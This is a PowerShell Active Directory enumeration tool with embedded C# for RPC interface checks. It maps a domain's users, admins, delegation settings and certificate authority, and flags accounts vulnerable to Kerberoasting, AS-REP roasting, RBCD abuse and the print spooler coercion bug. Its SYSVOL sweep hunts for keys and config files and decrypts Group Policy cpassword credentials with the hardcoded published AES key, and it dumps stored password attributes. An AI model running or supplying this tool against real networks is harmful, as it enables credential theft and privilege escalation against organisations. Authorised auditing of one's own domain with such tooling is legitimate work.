# Usage: Invoke-DomainEnumeration -DC 10.10.10.10 -Username user1@domain.com -Password s3cr3tPass

function Invoke-DomainEnumeration {
    param (
        [Parameter(Mandatory = $true)]
        [string]$DC,

        [Parameter(Mandatory = $false)]
        [string]$Username,

        [Parameter(Mandatory = $false)]
        [string]$Password
    )

    function Print-SectionHeader {
        param (
            [string]$Header
        )
        $width = 40
        $centeredHeader = $Header.PadLeft(($Header.Length + $width) / 2).PadRight($width)
        Write-Host ("`n" + "-" * $width)
        Write-Host -ForegroundColor Cyan $centeredHeader
        Write-Host ("-" * $width)
    }

    # Embed the C# code using Add-Type
    if (-not ([System.Management.Automation.PSTypeName]"RpcDump").Type) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class RpcDump
{
    private const string MS_PAR_UUID = "76F03F96-CDFD-44FC-A22C-64950A001209";
    private const string MS_RPRN_UUID = "12345678-1234-ABCD-EF00-0123456789AB";

    [DllImport("Rpcrt4.dll", CharSet = CharSet.Auto)]
    private static extern int RpcBindingFromStringBinding(
        string StringBinding,
        out IntPtr Binding
    );

    [DllImport("Rpcrt4.dll")]
    private static extern int RpcBindingFree(
        ref IntPtr Binding
    );

    [DllImport("Rpcrt4.dll", CharSet = CharSet.Auto)]
    private static extern int RpcMgmtIsServerListening(
        IntPtr Binding
    );

    [DllImport("Rpcrt4.dll", CharSet = CharSet.Auto)]
    private static extern int RpcStringBindingCompose(
        string ObjUuid,
        string ProtSeq,
        string NetworkAddr,
        string Endpoint,
        string Options,
        out string StringBinding
    );

    public static string CheckRpcInterface(string hostname, string uuid, string protocolName, string description)
    {
        IntPtr binding = IntPtr.Zero;
        string stringBinding;
        StringBuilder output = new StringBuilder();

        try
        {
            int result = RpcStringBindingCompose(
                uuid,
                "ncacn_ip_tcp",
                hostname,
                "135",
                null,
                out stringBinding
            );

            if (result == 0)
            {
                result = RpcBindingFromStringBinding(stringBinding, out binding);
                if (result == 0)
                {
                    result = RpcMgmtIsServerListening(binding);
                    if (result == 0)
                    {
                        output.AppendLine("Protocol: [" + protocolName + "]: " + description);
                    }
                }
            }
        }
        finally
        {
            if (binding != IntPtr.Zero)
            {
                RpcBindingFree(ref binding);
            }
        }

        return output.ToString();
    }

    public static string RunRpcDump(string hostname)
    {
        StringBuilder output = new StringBuilder();

        // Check MS-PAR
        output.Append(CheckRpcInterface(hostname, MS_PAR_UUID, "MS-PAR", "Print System Asynchronous Remote Protocol"));

        // Check MS-RPRN
        output.Append(CheckRpcInterface(hostname, MS_RPRN_UUID, "MS-RPRN", "Print System Remote Protocol"));

        return output.ToString();
    }
}
"@
    }

    # Function to perform RPC dump check against all domain computers
    function Invoke-RpcDumpCheck {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )

        Print-SectionHeader "RPCDump Check"

        # Get all domain computers (excluding MSA/GMSA)
        $computerSearch = [adsisearcher]"(&(objectClass=computer)(!(objectClass=msDS-ManagedServiceAccount))(!(objectClass=msDS-GroupManagedServiceAccount)))"
        $computerSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $computerSearch.PropertiesToLoad.AddRange(@("dNSHostName"))
        $computers = $computerSearch.FindAll()

        foreach ($computer in $computers) {
            $computerFQDN = $computer.Properties['dNSHostName'][0]
        
            # Skip if the computer FQDN is empty or invalid
            if ([string]::IsNullOrEmpty($computerFQDN)) {
                continue
            }

            # Run the RPC dump check
            try {
                # Capture the output of the RPC dump check
                $output = [RpcDump]::RunRpcDump($computerFQDN)

                # If the output contains RPC protocol information, display the computer and results
                if (-not [string]::IsNullOrEmpty($output)) {
                    Write-Host "Computer Account: $computerFQDN" -ForegroundColor Yellow
                    Write-Host $output -ForegroundColor Red
                }
            }
            catch {
                # Silently handle errors (e.g., offline or unreachable computers)
            }
        }
    }

    function List-GPOsAndLinks {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )

        Print-SectionHeader "GPO Enumeration"

        # First, get all GPOs in the domain and store them in a hashtable for quick lookup
        $gpoSearch = [adsisearcher]"(&(objectClass=groupPolicyContainer))"
        $gpoSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $gpoSearch.PropertiesToLoad.AddRange(@("displayName", "cn", "gPCFileSysPath"))
        $gpos = $gpoSearch.FindAll()

        if ($gpos.Count -eq 0) {
            Write-Host "No GPOs found in the domain."
            return
        }

        # Create a hashtable to map GPO GUIDs (with curly braces) to their display names
        $gpoMap = @{}
        foreach ($gpo in $gpos) {
            $gpoGuid = $gpo.Properties['cn'][0]  # The GUID is stored in the 'cn' attribute (with curly braces)
            $gpoName = $gpo.Properties['displayName'][0]
            $gpoMap[$gpoGuid] = $gpoName
        }

        # Now, search for all objects (OUs, domains, and containers) that have the gPLink attribute
        $gpoLinkSearch = [adsisearcher]"(gPLink=*)"
        $gpoLinkSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $gpoLinkSearch.PropertiesToLoad.AddRange(@("distinguishedName", "gPLink"))
        $gpoLinks = $gpoLinkSearch.FindAll()

        if ($gpoLinks.Count -eq 0) {
            Write-Host "No GPO links found in the domain."
            return
        }

        # Parse the gPLink attribute for each object
        foreach ($gpoLink in $gpoLinks) {
            $objectDN = $gpoLink.Properties['distinguishedName'][0]
            $gpoLinkValue = $gpoLink.Properties['gPLink'][0]

            Write-Host "Linked to: $objectDN" -ForegroundColor Yellow

            # Parse the gPLink value to extract GPO GUIDs (with curly braces)
            $gpoGuids = $gpoLinkValue -split '\]\[' | ForEach-Object {
                if ($_ -match '\{([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}') {
                    "{$($matches[1])}"  # Extract the GPO GUID and wrap it in curly braces
                }
            }

            # Display the GPOs linked to this object
            foreach ($gpoGuid in $gpoGuids) {
                if ($gpoMap.ContainsKey($gpoGuid)) {
                    Write-Host "  - GPO: $($gpoMap[$gpoGuid]) (GUID: $gpoGuid)" -ForegroundColor Green
                }
                else {
                    Write-Host "  - GPO: [Unknown] (GUID: $gpoGuid)" -ForegroundColor Red
                }
            }

            Write-Host " "
        }
    }

    function Get-DomainInfo {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $domain = [adsi]"LDAP://$DC/$BaseDN"
        Print-SectionHeader "Domain Info"
    
        # Construct the full domain name from the BaseDN
        $fullDomainName = ($BaseDN -replace 'DC=', '') -replace ',', '.'
        Write-Host "Domain Name: $fullDomainName"
    
        # Convert the SID byte array to a proper SID string
        if ($domain.objectSid -ne $null) {
            $sid = New-Object System.Security.Principal.SecurityIdentifier($domain.objectSid[0], 0)
            Write-Host "Domain SID: $($sid.Value)"
        }
        else {
            Write-Host "Domain SID: [Not available]"
        }
    }

    function Get-EnterpriseCA {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$ConfigNC
        )
        $caSearchBase = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigNC"
        $caSearch = [adsisearcher]"(&(objectClass=pKIEnrollmentService))"
        $caSearch.SearchRoot = [adsi]"LDAP://$DC/$caSearchBase"
        $caSearch.PropertiesToLoad.AddRange(@("name", "dNSHostName"))  # Add dNSHostName to the properties to load
        $cas = $caSearch.FindAll()
    
        Print-SectionHeader "ADCS Info"
        if ($cas.Count -gt 0) {
            foreach ($ca in $cas) {
                $caName = $ca.Properties['name'][0]
                $caServer = $ca.Properties['dNSHostName'][0]  # Get the server name (FQDN)
                Write-Host "Enterprise CA: $caServer\$caName"
            }
        }
        else {
            Write-Host "Enterprise CA not found."
        }
    }

    function List-Users {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $userSearch = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(!(objectClass=computer))(!(objectClass=msDS-ManagedServiceAccount))(!(objectClass=msDS-GroupManagedServiceAccount)))"
        $userSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $userSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName"))
        $users = $userSearch.FindAll()

        Print-SectionHeader "All Domain Users"
        foreach ($user in $users) {
            Write-Host "Username: $($user.Properties['sAMAccountName'][0]), UPN: $($user.Properties['userPrincipalName'][0]), DN: $($user.Properties['distinguishedName'][0])"
        }
    }

    function List-Computers {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $computerSearch = [adsisearcher]"(&(objectClass=computer)(!(objectClass=msDS-ManagedServiceAccount))(!(objectClass=msDS-GroupManagedServiceAccount)))"
        $computerSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $computerSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "distinguishedName"))
        $computers = $computerSearch.FindAll()

        Print-SectionHeader "All Domain Computers"
        foreach ($computer in $computers) {
            Write-Host "Computer: $($computer.Properties['sAMAccountName'][0]), DN: $($computer.Properties['distinguishedName'][0])"
        }
    }

    function List-ManagedServiceAccounts {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $managedSearch = [adsisearcher]"(|(objectClass=msDS-GroupManagedServiceAccount)(objectClass=msDS-ManagedServiceAccount))"
        $managedSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $managedSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName", "description", "objectClass"))
        $managedAccounts = $managedSearch.FindAll()

        Print-SectionHeader "Service Accounts"
        foreach ($account in $managedAccounts) {
            $samAccountName = $account.Properties['sAMAccountName'][0]
            $description = $account.Properties['description'][0]
            $objectClass = $account.Properties['objectClass']

            if ($objectClass -contains "msDS-GroupManagedServiceAccount") {
                $accountType = "Group Managed Service Account (gMSA)"
            }
            elseif ($objectClass -contains "msDS-ManagedServiceAccount") {
                $accountType = "Managed Service Account (MSA)"
            }
            else {
                $accountType = "Unknown"
            }

            Write-Host "SAM Account Name: $samAccountName"
            Write-Host "Account Type: $accountType"
            Write-Host "Description: $description"
            Write-Host " "
        }
    }

    function List-DomainControllers {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $dcSearch = [adsisearcher]"(&(userAccountControl:1.2.840.113556.1.4.803:=8192))"
        $dcSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $dcSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "distinguishedName"))
        $dcs = $dcSearch.FindAll()

        Print-SectionHeader "Domain Controllers"
        foreach ($dc in $dcs) {
            Write-Host "Domain Controller: $($dc.Properties['sAMAccountName'][0]), DN: $($dc.Properties['distinguishedName'][0])"
        }
    }

    function List-KerberoastableUsers {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $kerberoastableSearch = [adsisearcher]"(&(userAccountControl:1.2.840.113556.1.4.803:=512)(servicePrincipalName=*))"
        $kerberoastableSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $kerberoastableSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName"))
        $kerberoastableUsers = $kerberoastableSearch.FindAll()

        Print-SectionHeader "Kerberoastable Users"
        foreach ($user in $kerberoastableUsers) {
            Write-Host "Username: $($user.Properties['sAMAccountName'][0]), UPN: $($user.Properties['userPrincipalName'][0]), DN: $($user.Properties['distinguishedName'][0])"
        }
    }

    function List-ASREPRoastableUsers {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $asrepRoastableSearch = [adsisearcher]"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $asrepRoastableSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $asrepRoastableSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userAccountControl"))
        $asrepRoastableUsers = $asrepRoastableSearch.FindAll()

        Print-SectionHeader "AS-REP Roastable Users"
        foreach ($user in $asrepRoastableUsers) {
            if ($user.Properties['userAccountControl'][0] -ne 4194304) {
                Write-Host "sAMAccountName: $($user.Properties['sAMAccountName'][0])"
            }
        }
    }

    function List-AdminCountEquals1Users {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $adminCountSearch = [adsisearcher]"(&(objectClass=user)(adminCount=1))"
        $adminCountSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $adminCountSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName"))
        $adminCountUsers = $adminCountSearch.FindAll()

        Print-SectionHeader "Users with adminCount=1"
        foreach ($user in $adminCountUsers) {
            Write-Host "Username: $($user.Properties['sAMAccountName'][0]), UPN: $($user.Properties['userPrincipalName'][0]), DN: $($user.Properties['distinguishedName'][0])"
        }
    }

    function List-UsersWithWeakDescription {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $weakDescriptionSearch = [adsisearcher]"(&(objectClass=user)(description=*))"
        $weakDescriptionSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $weakDescriptionSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName", "description"))
        $weakDescriptionUsers = $weakDescriptionSearch.FindAll()

        Print-SectionHeader "Users with Description"
        foreach ($user in $weakDescriptionUsers) {
            Write-Host "SAM Account Name: $($user.Properties['sAMAccountName'][0])"
            Write-Host "Description: $($user.Properties['description'][0])"
            Write-Host " "
        }
    }

    function List-DomainAdmins {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $domainAdminsSearch = [adsisearcher]"(&(memberOf=CN=Domain Admins,CN=Users,$BaseDN))"
        $domainAdminsSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $domainAdminsSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName"))
        $domainAdmins = $domainAdminsSearch.FindAll()

        Print-SectionHeader "Domain Admins"
        foreach ($admin in $domainAdmins) {
            Write-Host "Admin Username: $($admin.Properties['sAMAccountName'][0]), UPN: $($admin.Properties['userPrincipalName'][0]), DN: $($admin.Properties['distinguishedName'][0])"
        }
    }

    function List-SCCMInstances {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        Print-SectionHeader "SCCM Info"
        try {
            $sccmSearch = [adsisearcher]"(objectClass=mSSMSManagementPoint)"
            $sccmSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
            $sccmSearch.PropertiesToLoad.Add("dNSHostName") | Out-Null
            $sccmInstances = $sccmSearch.FindAll()

            if ($sccmInstances.Count -gt 0) {
                foreach ($instance in $sccmInstances) {
                    $dnsHostName = $instance.Properties['dNSHostName'][0]
                    Write-Host "SCCM Management Point: $dnsHostName"
                    Write-Host " "
                }
            }
            else {
                Write-Host "No SCCM instances found."
            }
        }
        catch {
            Write-Host "SCCM is not installed or the schema is not extended."
            Write-Host "Error: $_"
        }
    }

    function List-ConstrainedDelegationAccounts {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $constrainedDelegationSearch = [adsisearcher]"(msDS-AllowedToDelegateTo=*)"
        $constrainedDelegationSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $constrainedDelegationSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName", "msDS-AllowedToDelegateTo"))
        $constrainedDelegationAccounts = $constrainedDelegationSearch.FindAll()

        Print-SectionHeader "Accounts with Constrained Delegation"
        foreach ($account in $constrainedDelegationAccounts) {
            Write-Host "Account: $($account.Properties['sAMAccountName'][0])"
            Write-Host "Allowed to Delegate To: $($account.Properties['msDS-AllowedToDelegateTo'][0])"
        }
    }

    function List-TrustedForDelegationAccounts {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $trustedForDelegationSearch = [adsisearcher]"(&(userAccountControl:1.2.840.113556.1.4.803:=524288))"
        $trustedForDelegationSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $trustedForDelegationSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName"))
        $trustedForDelegationAccounts = $trustedForDelegationSearch.FindAll()

        Print-SectionHeader "Accounts Trusted for Delegation"
        foreach ($account in $trustedForDelegationAccounts) {
            Write-Host "Account: $($account.Properties['sAMAccountName'][0]), UPN: $($account.Properties['userPrincipalName'][0]), DN: $($account.Properties['distinguishedName'][0])"
        }
    }

    function Check-PotentialPrinterBug {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        # Search filter to exclude MSA and GMSA accounts
        $computerSearch = [adsisearcher]"(&(objectClass=computer)(!(objectClass=msDS-ManagedServiceAccount))(!(objectClass=msDS-GroupManagedServiceAccount)))"
        $computerSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $computerSearch.PageSize = 1000
        $computers = $computerSearch.FindAll()

        Print-SectionHeader "Potential Printer Bug Abuse"
        foreach ($computer in $computers) {
            $computerName = $computer.Properties["name"][0]
            $computerFQDN = "$computerName.$BaseDN".Replace(",DC=", ".").Replace("DC=", "")

            # Check if the spoolss pipe exists using Get-ChildItem
            try {
                $spoolssPath = "\\$computerFQDN\pipe\spoolss"
                $spoolssExists = ls $spoolssPath -ErrorAction SilentlyContinue
                if ($spoolssExists) {
                    Write-Host "Computer Account: $computerFQDN" -ForegroundColor Yellow
                    Write-Host "$spoolssExists" -ForegroundColor Red
                    Write-Host " "
                }
            }
            catch {
                # Silently handle errors (e.g., inaccessible computers)
            }
        }
    }

    function List-AccountsWithPasswordAttributes {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $passwordAttributesSearch = [adsisearcher]"(|(unixUserPassword=*)(userPassword=*))"
        $passwordAttributesSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $passwordAttributesSearch.PropertiesToLoad.AddRange(@("sAMAccountName", "userPrincipalName", "distinguishedName", "unixUserPassword", "userPassword"))
        $accountsWithPasswordAttributes = $passwordAttributesSearch.FindAll()

        Print-SectionHeader "Accounts with Password Attributes"
        foreach ($account in $accountsWithPasswordAttributes) {
            Write-Host "Account: $($account.Properties['sAMAccountName'][0]), UPN: $($account.Properties['userPrincipalName'][0]), DN: $($account.Properties['distinguishedName'][0])"
        
            # Convert Unix User Password byte array to string (if not null)
            if ($account.Properties['unixUserPassword'] -and $account.Properties['unixUserPassword'][0] -ne $null) {
                $unixUserPasswordBytes = $account.Properties['unixUserPassword'][0]
                try {
                    $unixUserPasswordString = [System.Text.Encoding]::ASCII.GetString($unixUserPasswordBytes)
                    Write-Host "unixUserPassword: $unixUserPasswordString" -ForegroundColor Red
                }
                catch {
                    Write-Host "unixUserPassword: [Unable to decode]"
                }
            }
            else {
                Write-Host "unixUserPassword: [Not set]"
            }
        
            # Convert User Password byte array to string (if not null)
            if ($account.Properties['userPassword'] -and $account.Properties['userPassword'][0] -ne $null) {
                $userPasswordBytes = $account.Properties['userPassword'][0]
                try {
                    $userPasswordString = [System.Text.Encoding]::ASCII.GetString($userPasswordBytes)
                    Write-Host "userPassword: $userPasswordString" -ForegroundColor Red
                }
                catch {
                    Write-Host "userPassword: [Unable to decode]"
                }
            }
            else {
                Write-Host "userPassword: [Not set]"
            }
        
            Write-Host " "
        }
    }
    function Invoke-SYSVOLSweep {
        param (
            [string]$DomainName
        )

        Print-SectionHeader "SYSVOL Sweep"

        # Part 1: Find interesting files in SYSVOL
        $interestingExtensions = @("*.vbs", "*.bat", "*.ps1", "*.txt", "*.js", "*.vba", "*.sql", "id_rsa", "*.sqlite", "*.pfx", "*.crt", "*.config", "*.cfg", "*.sqldump", "*.ovpn", "*.pcap", "*.dmp", "*.py")
        $sysvolPath = "\\$DomainName\SYSVOL\$DomainName"

        Write-Host "Searching for interesting files..."
        foreach ($extension in $interestingExtensions) {
            $files = Get-ChildItem -Path $sysvolPath -Recurse -Filter $extension -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                Write-Host "Found interesting file: $($file.FullName)" -ForegroundColor Yellow
            }
        }
        Write-Host " "
        # Part 2: Find and decrypt cpassword credentials in GPP XML files
        $gppFiles = @('Groups.xml', 'Services.xml', 'Scheduledtasks.xml', 'DataSources.xml', 'Printers.xml', 'Drives.xml')
        $policiesPath = "\\$DomainName\SYSVOL\$DomainName\Policies"

        Write-Host "Searching for GPP XML files with cpassword..."
        foreach ($gppFile in $gppFiles) {
            $xmlFiles = Get-ChildItem -Path $policiesPath -Recurse -Filter $gppFile -ErrorAction SilentlyContinue
            foreach ($xmlFile in $xmlFiles) {
                #Write-Host "Found GPP XML file: $($xmlFile.FullName)" -ForegroundColor Yellow
                $xmlContent = Get-Content -Path $xmlFile.FullName -Raw
                if ($xmlContent -match 'cpassword="([^"]+)"') {
                    Write-Host "Found cpassword value(s) in $($xmlFile.FullName)" -ForegroundColor Red
                    Write-Host " "
                    $cpassword = $matches[1]
                    #Write-Host "cpassword value: $cpassword" -ForegroundColor Cyan

                    # Debug: Check if the cpassword is a valid Base64 string
                    try {
                        $paddingNeeded = $cpassword.Length % 4
                        if ($paddingNeeded -gt 0) {
                            $cpassword += "=" * (4 - $paddingNeeded)
                        }
                        $cpasswordBytes = [System.Convert]::FromBase64String($cpassword)
                        #Write-Host "cpassword is a valid Base64 string." -ForegroundColor Green
                    }
                    catch {
                        #Write-Host "cpassword is NOT a valid Base64 string: $_" -ForegroundColor Red
                        continue
                    }

                    # Parse the XML and extract the name and cpassword
                    $xml = [xml]$xmlContent
                    $nodes = $xml.SelectNodes("//*[@cpassword]")
                    foreach ($node in $nodes) {
                        # Extract the name attribute
                        $name = $node.GetAttribute("name")
                        if ([string]::IsNullOrEmpty($name)) {
                            # If name is not found, try to get it from a parent or sibling node
                            $name = $node.ParentNode.GetAttribute("name")
                        }

                        # Extract the cpassword attribute
                        $cpassword = $node.GetAttribute("cpassword")
                        $decryptedPassword = Decrypt-GPPPassword $cpassword

                        # Display the results
                        Write-Host "Name: $name" -ForegroundColor Cyan
                        Write-Host "cpassword: $cpassword" -ForegroundColor Red
                        Write-Host "Decrypted Password: $decryptedPassword" -ForegroundColor Green
                        Write-Host " "
                    }
                }
            }
        }
    }

    # Function to decrypt GPP cpassword
    function Decrypt-GPPPassword {
        param (
            [string]$cpassword
        )

        # AES key for decrypting cpassword
        $key = @(0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
            0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b)

        # Ensure the cpassword is properly padded for Base64 decoding
        $paddingNeeded = $cpassword.Length % 4
        if ($paddingNeeded -gt 0) {
            $cpassword += "=" * (4 - $paddingNeeded)
        }

        try {
            # Convert the cpassword from Base64 to bytes
            $cpasswordBytes = [System.Convert]::FromBase64String($cpassword)

            # Create AES decryptor
            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $aes.Key = $key
            $aes.IV = New-Object byte[] 16
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

            # Decrypt the password
            $decryptor = $aes.CreateDecryptor()
            $decryptedBytes = $decryptor.TransformFinalBlock($cpasswordBytes, 0, $cpasswordBytes.Length)
            $decryptedPassword = [System.Text.Encoding]::Unicode.GetString($decryptedBytes)

            return $decryptedPassword
        }
        catch {
            Write-Host "Failed to decrypt cpassword: $_" -ForegroundColor Red
            return "[Decryption Failed]"
        }
    }
    function Find-PossibleRBCD {
        param (
            [System.DirectoryServices.DirectoryEntry]$Connection,
            [string]$BaseDN
        )
        $excludedEntities = 'NT AUTHORITY\SYSTEM', 'BUILTIN\Administrators', 'BUILTIN\Account Operators', 'S-1-5-32-548'
        $domainPrefixedEntities = 'Domain Admins', 'Enterprise Admins', 'exchange trusted subsystem', 'organization management', 'exchange windows permissions'

        # Filter out MSA and GMSA accounts
        $computerSearch = [adsisearcher]"(&(objectClass=computer)(!(objectClass=msDS-ManagedServiceAccount))(!(objectClass=msDS-GroupManagedServiceAccount)))"
        $computerSearch.SearchRoot = [adsi]"LDAP://$DC/$BaseDN"
        $computerSearch.PageSize = 1000
        $computers = $computerSearch.FindAll()

        Print-SectionHeader "Potential RBCD Abuse"
        foreach ($computer in $computers) {
            $computerDN = $computer.Properties["distinguishedName"][0]
            $acl = (New-Object System.DirectoryServices.DirectoryEntry "LDAP://$computerDN").ObjectSecurity.Access
            $permissions = @{}

            foreach ($ace in $acl) {
                $identity = $ace.IdentityReference.Value

                # Resolve SID to account name
                try {
                    $sid = New-Object System.Security.Principal.SecurityIdentifier($identity)
                    $account = $sid.Translate([System.Security.Principal.NTAccount])
                    $identity = $account.Value
                }
                catch {
                    # If translation fails, keep the SID
                    $identity = $ace.IdentityReference.Value
                }

                # Check if the identity is in the excluded entities list
                $isExcluded = $excludedEntities -contains $identity -or $domainPrefixedEntities -contains $identity.Split('\')[-1]

                # Exclude Account Operators and other excluded entities
                if ($ace.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl|WriteOwner|WriteAccountRestrictions|AllowedToAct' -and -not $isExcluded) {
                    if (-not $permissions.ContainsKey($identity)) { $permissions[$identity] = @() }
                    $permissions[$identity] += $ace.ActiveDirectoryRights
                }
            }

            if ($permissions.Count -gt 0) {
                Write-Host "[!] Computer object:" 
                Write-Host "$($computer.Properties["name"][0])" -ForegroundColor Yellow
                Write-Host "[!] Users with permissions:" 
                foreach ($user in $permissions.Keys) { Write-Host "$user -> $($permissions[$user] -join ', ')" -ForegroundColor Yellow }
                Write-Host " "
            }
        }
    }

    # Main script execution
    try {
        # Extract domain name from the provided username
        if ($Username -and ($Username -match "^[^@]+@[^@]+\.[^@]+$")) {
            $domainName = $Username.Split('@')[-1]
        }
        else {
            $domainName = (Get-WmiObject Win32_ComputerSystem).Domain
            if ($domainName -notmatch "\.") {
                $domainName = Read-Host "This machine is not domain-joined. Enter domain name (e.g., company.local)"
            }
        }
        $baseDN = ($domainName.Split('.') | ForEach-Object { "DC=$_" }) -join ','

        # Create a connection to the LDAP server
        if ($Username -and $Password) {
            $connection = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DC/$baseDN", $Username, $Password)
        }
        else {
            $connection = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DC/$baseDN")
        }

        if ($connection.Path -eq $null) {
            throw "Failed to connect to the LDAP server."
        }

        # Get RootDSE information
        $rootDSE = [adsi]"LDAP://$DC/RootDSE"
        $configNC = $rootDSE.configurationNamingContext

        # Display domain and CA information
        Get-DomainInfo -Connection $connection -BaseDN $baseDN
        Get-EnterpriseCA -Connection $connection -ConfigNC $configNC
        List-SCCMInstances -Connection $connection -BaseDN $baseDN

        # List other objects
        List-Users -Connection $connection -BaseDN $baseDN
        List-Computers -Connection $connection -BaseDN $baseDN
        Find-PossibleRBCD -Connection $connection -BaseDN $baseDN
        Check-PotentialPrinterBug -Connection $connection -BaseDN $baseDN
        Invoke-RpcDumpCheck -Connection $connection -BaseDN $baseDN
        List-ManagedServiceAccounts -Connection $connection -BaseDN $baseDN
        List-DomainControllers -Connection $connection -BaseDN $baseDN
        List-KerberoastableUsers -Connection $connection -BaseDN $baseDN
        List-ASREPRoastableUsers -Connection $connection -BaseDN $baseDN
        List-AdminCountEquals1Users -Connection $connection -BaseDN $baseDN
        List-UsersWithWeakDescription -Connection $connection -BaseDN $baseDN
        List-DomainAdmins -Connection $connection -BaseDN $baseDN
        List-ConstrainedDelegationAccounts -Connection $connection -BaseDN $baseDN
        List-TrustedForDelegationAccounts -Connection $connection -BaseDN $baseDN
        List-AccountsWithPasswordAttributes -Connection $connection -BaseDN $baseDN
        List-GPOsAndLinks -Connection $connection -BaseDN $baseDN
        Invoke-SYSVOLSweep -DomainName $domainName

        Write-Host ("`n" + "-" * 40)
    }
    catch {
        Write-Host "An error occurred: $_"
    }
}
